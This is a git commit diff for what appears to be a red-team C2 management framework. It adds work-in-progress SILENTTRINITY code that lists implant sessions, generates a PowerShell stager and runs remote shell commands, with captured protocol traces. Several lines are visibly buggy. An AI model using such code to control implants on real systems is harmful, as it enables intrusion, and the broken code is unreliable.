09cf5c04b8e2e406e5ecd0969976abe9bfe3d1db
lbonastre <lucas.bonastre@pucarasec.com>
2022-01-04 21:03:03 +0000

    added   retrieve  agentes via wss

--- src/zuthaka/backendapi/services/ClassHandlers/SilentTrinity/silenttrinity_c2.py
+++ src/zuthaka/backendapi/services/ClassHandlers/SilentTrinity/silenttrinity_c2.py
@@ -128,7 +128,30 @@ class SilentTriC2(C2):
                raises ValueError in case of invalid dto
                raises ConectionError in case of not be able to connect to c2 instance
         """
-        pass
+        # ---> {"id": "eqWKq4m74d", "ctx": "sessions", "cmd": "get_selected", "args": {}, "data": {}}
+        # <--- {"type": "message", "id": "eqWKq4m74d", "ctx": "sessions", "name": "get_selected", "status": "error", "result": "Command 'get_selected' does not exist in context 'sessions'"}
+
+        # ---> {"id": "i8Qz3wVLUt", "ctx": "sessions", "cmd": "list", "args": {}, "data": {}}
+        # <--- {"type": "message", "id": "i8Qz3wVLUt", "ctx": "sessions", "name": "list", "status": "success", "result": {"b0c71f5e-660b-4f93-b722-9df523b4b063": {"guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "alias": "b0c71f5e-660b-4f93-b722-9df523b4b063", "address": "192.168.0.117", "info": {"OsReleaseId": "2009", "Jobs": 1, "Sleep": 5000, "Guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "ProcessId": 7236, "Os": "Microsoft Windows 10 Home 10.0.19043.0", "DotNetVersion": "4.0.30319.42000", "Hostname": "DESKTOP-2LD29PJ", "MinJitter": 0, "HighIntegrity": false, "Debug": true, "MaxJitter": 0, "ProcessName": "powershell", "NetworkAddresses": ["192.168.0.117", "169.254.51.246"], "Domain": "DESKTOP-2LD29PJ", "OsArch": "x64", "Username": "criso", "C2Channels": ["https"], "CallBackUrls": [["https://192.168.0.173:8899"]]}, "lastcheckin": 2.287958860397339}}}
+        set_ctx = {"id": "eqWKq4m74d", "ctx": "sessions", "cmd": "get_selected", "args": {}, "data": {}}
+        await ws.send(json.dumps(set_ctx))
+        await recv_(ws)
+        cmd_list = {"id": "i8Qz3wVLUt", "ctx": "sessions", "cmd": "list", "args": {}, "data": {}} 
+        await ws.send(json.dumps(cmd_list))
+        response = await recv_(ws)
+        agents = response['results']
+        for agent_id in agents:
+            _agent = AgentDto(
+                internal_id=agent_id,
+                hostname=agents['agent']['info']['Hostname'],
+                active=True,
+                listener_internal_id=1,
+                agent_shell_type='powershell',
+                username='criso'
+            )
+        dto = ResponseDto()
+        return dto
+
 
 
 class SilentTriHTTPListenerType(ListenerType):
@@ -221,18 +244,24 @@ class SilentTriPowershellLauncherType(LauncherType):
         # ---> {"id": "xOUvWeyOk3", "ctx": "stagers", "cmd": "get_selected", "args": {}, "data": {}}
         # <--- {"type": "message", "id": "xOUvWeyOk3", "ctx": "stagers", "name": "get_selected", "status": "success", "result": {"name": "wmic", "description": "Stage via wmic XSL execution", "author": "@byt3bl33d3r", "options": {}}}
 
+        # ---> {"id": "d3rTRvnuhT", "ctx": "listeners", "cmd": "set", "args": {"name": "Name", "value": "test"}, "data": {}}
+
         # ---> {"id": "GSdJMyul3K", "ctx": "stagers", "cmd": "use", "args": {"name": "powershell_stageless"}, "data": {}}
         # <--- {"type": "message", "id": "GSdJMyul3K", "ctx": "stagers", "name": "use", "status": "success", "result": {"name": "powershell_stageless", "description": "Embeds the BooLang Compiler within PowerShell and directly executes STs stager", "author": "@byt3bl33d3r", "options": {"AsFunction": {"Description": "Generate stager as a PowerShell function", "Required": false, "Value": true}}}}
-
 
         # ---> {"id": "4hM4EksY4b", "ctx": "stagers", "cmd": "generate", "args": {"listener_name": "https"}, "data": {}}                                                                                             
         # <--- {"type": "message", "id": "4hM4EksY4b", "ctx": "stagers", "name": "generate", "status": "success", "result": {"output": "function Invoke-L..... ", "suggestions": "", "extension": "ps1"}}
 
+        set_ctx = {"id": "xOUvWeyOk3", "ctx": "stagers", "cmd": "get_selected", "args": {}, "data": {}}
+        await ws.send(json.dumps(set_ctx))
+        await recv_(ws)
 
+        set_powershell_stagless = {"id": "GSdJMyul3K", "ctx": "stagers", "cmd": "use", "args": {"name": "powershell_stageless"}, "data": {}}
+        await ws.send(json.dumps(set_powershell_stagless))
         await recv_(ws)
-        await recv_(ws)
-        set_listeners = {"id": "SeI6WD3JP5", "ctx": "listeners", "cmd": "get_selected", "args": {}, "data": {}}
-        await ws.send(json.dumps(set_listeners))
+
+        set_generate = {"id": "4hM4EksY4b", "ctx": "stagers", "cmd": "generate", "args": {"listener_name": "https"}, "data": {}}                                                                                             
+        await ws.send(json.dumps(set_generate))
         await recv_(ws)
 
 class PowershellAgentType(AgentType):
@@ -249,7 +278,29 @@ class PowershellAgentType(AgentType):
            raises ConectionError in case of not be able to connect to c2 instance
            raises ResourceNotFoundError
         """
-        raise NotImplementedError
+        # ---> {"id": "Qv9BdutEJ0", "ctx": "modules", "cmd": "use", "args": {"name": "boo/shell"}, "data": {}}
+        # <--- {"type": "message", "id": "Qv9BdutEJ0", "ctx": "modules", "name": "use", "status": "success", "result": {"name": "boo/shell", "language": "boo", "description": "Runs a shell command", "author": "@byt3bl33d3r", "references": [], "options": {"Command": {"Description": "The ShellCommand to execute, including any arguments", "Required": true, "Value": ""}, "Path": {"Description": "The Path of the directory from which to execute the ShellCommand", "Required": false, "Value": "C:\\WINDOWS\\System32"}, "Username": {"Description": "Optional alternative username to execute ShellCommand as", "Required": false, "Value": ""}, "Domain": {"Description": "Optional alternative Domain of the username to execute ShellCommand as", "Required": false, "Value": ""}, "Password": {"Description": "Optional password to authenticate the username to execute the ShellCommand as", "Required": false, "Value": ""}}}}
+
+        # ---> {"id": "kTZN3U1Xtz", "ctx": "modules", "cmd": "set", "args": {"name": "command", "value": "whoami"}, "data": {}}
+        # <--- {"type": "message", "id": "kTZN3U1Xtz", "ctx": "modules", "name": "set", "status": "success", "result": null}   
+
+        # ---> {"id": "tfwCJrSKZf", "ctx": "modules", "cmd": "run", "args": {"guids": ["b0c71f5e-660b-4f93-b722-9df523b4b063"]}, "data": {}}
+        # <--- {"type": "message", "id": "tfwCJrSKZf", "ctx": "modules", "name": "run", "status": "success", "result": null}
+        # <--- {"type": "event", "name": "JOB_RESULT", "data": {"id": "Aw8lrj6luD", "output": "[*] Path: C:\\WINDOWS\\System32 Command: whoami Args: \r\ndesktop-2ld29pj\\criso\r\n\r\n", "session": "b0c71f5e-660b-4f93-b722-9df523b4b063", "address": "192.168.0.117"}}
+        # [*] [TS-UM5UF] b0c71f5e-660b-4f93-b722-9df523b4b063 returned job result (id: Aw8lrj6luD)
+        # [*] Path: C:\WINDOWS\System32 Command: whoami Args: 
+        # desktop-2ld29pj\criso
+        set_ctx = {"id": "Qv9BdutEJ0", "ctx": "modules", "cmd": "use", "args": {"name": "boo/shell"}, "data": {}}
+        await ws.send(json.dumps(set_ctx))
+        await recv_(ws)
+
+        set_ctx = {"id": "kTZN3U1Xtz", "ctx": "modules", "cmd": "set", "args": {"name": "command", "value": "whoami"}, "data": {}}
+        await ws.send(json.dumps(set_ctx))
+        await recv_(ws)
+
+        set_ctx = {"id": "tfwCJrSKZf", "ctx": "modules", "cmd": "run", "args": {"guids": ["b0c71f5e-660b-4f93-b722-9df523b4b063"]}, "data": {}}
+        await ws.send(json.dumps(set_ctx))
+        await recv_(ws)
 
     async def download_file(self, download_dto: DownloadFileDto, dto: RequestDto) -> bytes:
         """
@@ -269,5 +320,4 @@ class PowershellAgentType(AgentType):
            raises ResourceNotFoundError 
 
         """
-        
         raise NotImplementedError
